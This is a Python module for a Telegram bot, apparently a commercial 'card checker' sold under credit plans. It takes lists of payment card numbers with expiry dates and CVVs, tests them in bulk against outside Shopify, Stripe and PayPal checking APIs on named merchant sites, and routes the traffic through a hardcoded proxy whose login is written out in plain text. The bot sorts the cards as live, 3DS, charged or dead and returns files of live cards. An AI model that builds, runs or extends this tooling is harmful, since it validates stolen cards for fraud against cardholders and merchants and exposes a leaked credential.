import aiohttp
import asyncio
import time
import re
from io import BytesIO
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes, CallbackQueryHandler
from config import API_TIMEOUT, get_bin_info

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 SHARED CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MAX_CARDS = 500
SEMAPHORE_LIMIT = 10

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 API CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SH_API = "https://autosh.up.railway.app/shopii"
SH_GATE_NAME = "Sʜᴏᴘɪғʏ"
SH_API_TIMEOUT = 120

CHK_API_URL = "https://stripe-auth-test-production.up.railway.app/st0"
CHK_SITE = "fashionspicex.com"
CHK_TIMEOUT = 180

PP_NEW_API = "https://paypal0-1.onrender.com/pp1/cc={card}"
PP_GATE_NAME = "PᴀʏPᴀʟ"
PP_TIMEOUT = API_TIMEOUT

PROXIES = [
    "http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780",
]

SITES = [
    "https://powerbuild.store",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FILE & CARD PARSING UTILITIES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def parse_cards(text: str) -> list:
    """Extracts valid card patterns from messy text."""
    cards = []
    # Regex to match 13-19 digits, followed by separators and MM|YY|CVV
    # Also matches plain 13-19 digit numbers
    pattern = r'\b(\d{13,19})\s*[^a-zA-Z0-9\n]?\s*(\d{1,2})\s*[^a-zA-Z0-9\n]?\s*(\d{2,4})\s*[^a-zA-Z0-9\n]?\s*(\d{3,4})\b|\b(\d{13,19})\b'
    matches = re.findall(pattern, text)
    for match in matches:
        if match[0]: # Full match with date
            cards.append(f"{match[0]}|{match[1]}|{match[2]}|{match[3]}")
        elif match[4]: # Plain card number
            cards.append(match[4])
    return cards

async def _download_file_cards(bot, file_id: str) -> str | None:
    """Download a text file from Telegram and return its content as string."""
    try:
        file = await bot.get_file(file_id)
        content = await file.download_as_bytearray()
        if content:
            try:
                return content.decode("utf-8", errors="ignore")
            except:
                return content.decode("latin-1", errors="ignore")
        return None
    except Exception as e:
        print(f"Download error: {e}")
        return None

async def extract_cards_from_update(update: Update, bot) -> list | None:
    """
    Extract cards from:
    1. Direct text after command: /msh cc|mm|yy|cvv
    2. Reply to a text message containing cards
    3. Reply to a file document containing cards (.txt)
    4. Send a file directly as document (with command as caption)
    """
    msg = update.message
    
    # 1. Direct text after command
    if update.args:
        return parse_cards(" ".join(update.args))
    
    # 2. Reply to message (text or file)
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text and replied.text.strip():
            return parse_cards(replied.text)
        if replied.document and replied.document.file_id:
            content = await _download_file_cards(bot, replied.document.file_id)
            if content:
                return parse_cards(content)

    # 3. Direct file sent (user sent file with command as caption)
    if msg.document and msg.document.file_id:
        content = await _download_file_cards(bot, msg.document.file_id)
        if content:
            return parse_cards(content)

    # 4. Message text (if command was in message without args)
    if msg.text and msg.text.strip() and not msg.text.startswith('/'):
        return parse_cards(msg.text)

    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CREDITS & BUTTONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class ProxyRotator:
    def __init__(self, proxies: list):
        self.proxies = proxies
        self._index = 0

    def next(self) -> str | None:
        if not self.proxies: return None
        proxy = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return proxy

    def count(self) -> int:
        return len(self.proxies)

async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amount: int) -> bool:
    uid = str(user_id)
    if "user_data" not in context.bot_data: context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"plan": "TRIAL", "credits": 0, "expires": 0}
        
    ud = context.bot_data["user_data"][uid]
    is_premium = ud.get("plan", "TRIAL").upper() != "TRIAL" and ud.get("expires", 0) > time.time()
    if is_premium:
        return True
    available = ud.get("credits", 0)
    if available < amount:
        return False
    ud["credits"] = available - amount
    return True

def create_result_buttons() -> InlineKeyboardMarkup:
    """Create the 4 action buttons for result"""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ LIVE", callback_data="result_live"),
            InlineKeyboardButton("🔐 3DS", callback_data="result_3ds"),
        ],
        [
            InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"),
            InlineKeyboardButton("📦 ALL", callback_data="result_all"),
        ]
    ])

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHOPIFY MASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_shopify_card(session: aiohttp.ClientSession, card: str, site: str, proxy: str | None, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        params = {"cc": card, "site": site}
        if proxy: params["proxy"] = proxy
        try:
            async with session.get(SH_API, params=params) as resp:
                try: data = await resp.json(content_type=None)
                except Exception: data = {"Response": await resp.text(), "Status": "false"}
                if not isinstance(data, dict): data = {"Response": str(data), "Status": "false"}
                
                response_text = str(data.get("Response", "ERROR"))
                status = str(data.get("Status", "false")).lower()
                
                if status == "true" or "approved" in response_text.lower(): card_status = "approved"
                elif "3ds" in response_text.lower() or "3d secure" in response_text.lower(): card_status = "3ds"
                elif "charged" in response_text.lower() or "captured" in response_text.lower(): card_status = "charged"
                else: card_status = "dead"
                
                return {"card": card, "gateway": data.get("Gateway", "N/A"), "price": data.get("Price", "N/A"), "response": response_text, "status": status, "card_status": card_status, "error": None}
        except asyncio.TimeoutError: return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
        except Exception as e: return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}

async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("msh_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return

    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴏʀ ꜰɪʟᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ, ᴏʀ ᴜꜱᴇ:\n• <code>/msh cc|mm|yy|cvv</code>\n• Reply to a .txt file with /msh", parse_mode="HTML"); return

    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ. Yᴏᴜ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML"); return

    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML"); return

    rotator = ProxyRotator(PROXIES)
    sites = SITES if SITES else ["https://powerbuild.store"]
    msg = await update.message.reply_text(f"[₪] Gᴀᴛᴇ ➺ {SH_GATE_NAME} | 0-5 Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")

    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=SH_API_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
        tasks = [check_single_shopify_card(session, c, sites[i % len(sites)], rotator.next(), semaphore) for i, c in enumerate(cards)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list = [r for r in parsed if r.get("error")]

    context.bot_data[f"msh_results_{update.effective_user.id}"] = {"parsed": parsed, "approved": approved_list, "charged": charged_list, "threeds": threeds_list, "dead": dead_list, "error": error_list, "gate": SH_GATE_NAME, "total": len(parsed)}

    lines = [
        f"[₪] Gᴀᴛᴇ ➺ {SH_GATE_NAME} | 0-5 Usd ",
        "━━━━━━━━━━━━━━",
        f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅",
        f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}",
        "━━━━━━━━━━━━━━",
        f"♘ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)} ✅",
        f"♞ Cʜᴀʀɢᴇᴅ ➺ {len(charged_list)} 💎",
        f"3ᴅs ➺ {len(threeds_list)} 🔐",
        f"Dᴇᴀᴅ ➺ {len(dead_list)} ❌",
        f"Eʀʀᴏʀs ➺ {len(error_list)} ⚠️",
        f"Tɪᴍᴇ ➺ {time.time() - start_time:.1f}s",
    ]
    await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STRIPE MASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_stripe_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        api_url = f"{CHK_API_URL}?cc={card}&site={CHK_SITE}"
        try:
            async with session.get(api_url) as resp:
                try: data = await resp.json(content_type=None)
                except Exception: data = {"response": await resp.text()}
                if not isinstance(data, dict): data = {"response": str(data)}
                raw_response = str(data.get("response", "NO RESPONSE"))
                raw_response = re.sub(r'https?://\S+', '', raw_response).strip()
                if not raw_response: raw_response = "NO RESPONSE"
                
                if "approved" in raw_response.lower(): card_status = "approved"
                elif "3ds" in raw_response.lower() or "3d secure" in raw_response.lower(): card_status = "3ds"
                elif "charged" in raw_response.lower() or "captured" in raw_response.lower(): card_status = "charged"
                else: card_status = "dead"
                
                return {"card": card, "response": raw_response, "status": "true" if "approved" in raw_response.lower() else "false", "card_status": card_status, "error": None}
        except asyncio.TimeoutError: return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
        except Exception as e: return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}

async def cmd_mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("mchk_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return

    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴏʀ ꜰɪʟᴇ, ᴏʀ ᴜꜱᴇ <code>/mchk cc|mm|yy|cvv</code>", parse_mode="HTML"); return
    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ.", parse_mode="HTML"); return
    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML"); return

    msg = await update.message.reply_text(f"[₪] Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ | 0$ Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")

    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=CHK_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
        tasks = [check_single_stripe_card(session, c, semaphore) for c in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list = [r for r in parsed if r.get("error")]

    context.bot_data[f"mchk_results_{update.effective_user.id}"] = {"parsed": parsed, "approved": approved_list, "charged": charged_list, "threeds": threeds_list, "dead": dead_list, "error": error_list, "gate": "Sᴛʀɪᴘᴇ", "total": len(parsed)}

    lines = [
        f"[₪] Gᴀᴛᴇ ➺ Sᴛʀɪᴘᴇ | 0$ Usd ",
        "━━━━━━━━━━━━━━",
        f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅",
        f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}",
        "━━━━━━━━━━━━━━",
        f"♘ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)} ✅",
        f"♞ Cʜᴀʀɢᴇᴅ ➺ {len(charged_list)} 💎",
        f"3ᴅs ➺ {len(threeds_list)} 🔐",
        f"Dᴇᴀᴅ ➺ {len(dead_list)} ❌",
        f"Eʀʀᴏʀs ➺ {len(error_list)} ⚠️",
        f"Tɪᴍᴇ ➺ {time.time() - start_time:.1f}s",
    ]
    await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PAYPAL MASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def check_single_pp_card(session: aiohttp.ClientSession, card: str, semaphore: asyncio.Semaphore) -> dict:
    async with semaphore:
        api_url = PP_NEW_API.format(card=card)
        try:
            async with session.get(api_url) as resp:
                try: data = await resp.json(content_type=None)
                except Exception: data = {"status": "declined", "message": await resp.text()}
                if not isinstance(data, dict): data = {"status": "declined", "message": str(data)}
                status = str(data.get("status", "declined")).lower()
                message = str(data.get("message", "NO RESPONSE"))
                raw = message or "NO RESPONSE"
                raw = re.sub(r'https?://\S+', '', raw).strip()
                if not raw: raw = "NO RESPONSE"
                
                if status == "approved": card_status = "approved"
                elif "3ds" in raw.lower() or "3d secure" in raw.lower(): card_status = "3ds"
                elif "charged" in raw.lower() or "captured" in raw.lower(): card_status = "charged"
                else: card_status = "dead"
                
                return {"card": card, "response": raw, "status": "true" if status == "approved" else "false", "card_status": card_status, "error": None}
        except asyncio.TimeoutError: return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
        except Exception as e: return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}

async def cmd_mpp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.bot_data.get("mpp_on", True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return

    cards = await extract_cards_from_update(update, context.bot)
    if not cards:
        await update.message.reply_text("⚠️ Uꜱᴀɢᴇ: Rᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ ᴏʀ ꜰɪʟᴇ, ᴏʀ ᴜꜱᴇ <code>/mpp cc|mm|yy|cvv</code>", parse_mode="HTML"); return
    if len(cards) > MAX_CARDS:
        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ.", parse_mode="HTML"); return
    if not await deduct_credits(context, update.effective_user.id, len(cards)):
        user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML"); return

    msg = await update.message.reply_text(f"[₪] Gᴀᴛᴇ ➺ {PP_GATE_NAME} | 0.10$ Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")

    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    start_time = time.time()

    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=PP_TIMEOUT), connector=aiohttp.TCPConnector(limit=SEMAPHORE_LIMIT, ssl=False)) as session:
        tasks = [check_single_pp_card(session, c, semaphore) for c in cards]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    parsed = [r if not isinstance(r, Exception) else {"card": "???", "error": str(r)[:60], "response": "ERROR", "status": "false", "card_status": "dead"} for r in results]
    approved_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "approved"]
    charged_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "charged"]
    threeds_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "3ds"]
    dead_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
    error_list = [r for r in parsed if r.get("error")]

    context.bot_data[f"mpp_results_{update.effective_user.id}"] = {"parsed": parsed, "approved": approved_list, "charged": charged_list, "threeds": threeds_list, "dead": dead_list, "error": error_list, "gate": PP_GATE_NAME, "total": len(parsed)}

    lines = [
        f"[₪] Gᴀᴛᴇ ➺ {PP_GATE_NAME} | 0.10$ Usd ",
        "━━━━━━━━━━━━━━",
        f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅",
        f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}",
        "━━━━━━━━━━━━━━",
        f"♘ Aᴘᴘʀᴏᴠᴇᴅ ➺ {len(approved_list)} ✅",
        f"♞ Cʜᴀʀɢᴇᴅ ➺ {len(charged_list)} 💎",
        f"3ᴅs ➺ {len(threeds_list)} 🔐",
        f"Dᴇᴀᴅ ➺ {len(dead_list)} ❌",
        f"Eʀʀᴏʀs ➺ {len(error_list)} ⚠️",
        f"Tɪᴍᴇ ➺ {time.time() - start_time:.1f}s",
    ]
    await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS CALLBACK HANDLER (FOR THE 4 BUTTONS)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    # Find which mass result key exists for this user
    data_key = None
    for prefix in ["msh", "mchk", "mpp"]:
        key = f"{prefix}_results_{user_id}"
        if key in context.bot_data:
            data_key = key
            break
            
    if not data_key:
        await query.answer("Results expired. Please run the command again.", show_alert=True)
        return
        
    results = context.bot_data[data_key]
    data = query.data
    file_content = ""
    file_name = ""
    
    if data == "result_live":
        file_name = f"live_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("approved", [])])
        if not file_content: file_content = "No approved (live) cards found."
    elif data == "result_3ds":
        file_name = f"3ds_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("threeds", [])])
        if not file_content: file_content = "No 3DS cards found."
    elif data == "result_charge":
        file_name = f"charged_cards_{user_id}.txt"
        file_content = "\n".join([r["card"] for r in results.get("charged", [])])
        if not file_content: file_content = "No charged cards found."
    elif data == "result_all":
        file_name = f"all_results_{user_id}.txt"
        lines = []
        for r in results.get("parsed", []):
            card = r.get("card", "N/A")
            status = r.get("card_status", "N/A").upper()
            resp = r.get("response", "N/A")
            lines.append(f"{card} - {status} - {resp}")
        file_content = "\n".join(lines)
        if not file_content: file_content = "No cards processed."
        
    bio = BytesIO(file_content.encode('utf-8'))
    bio.name = file_name
    await context.bot.send_document(chat_id=query.message.chat_id, document=bio, filename=file_name)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_mass_handlers():
    return [
        CommandHandler("msh", cmd_msh),
        CommandHandler("mchk", cmd_mchk),
        CommandHandler("mpp", cmd_mpp),
        CallbackQueryHandler(mass_callback_handler, pattern=r'^result_')
    ]
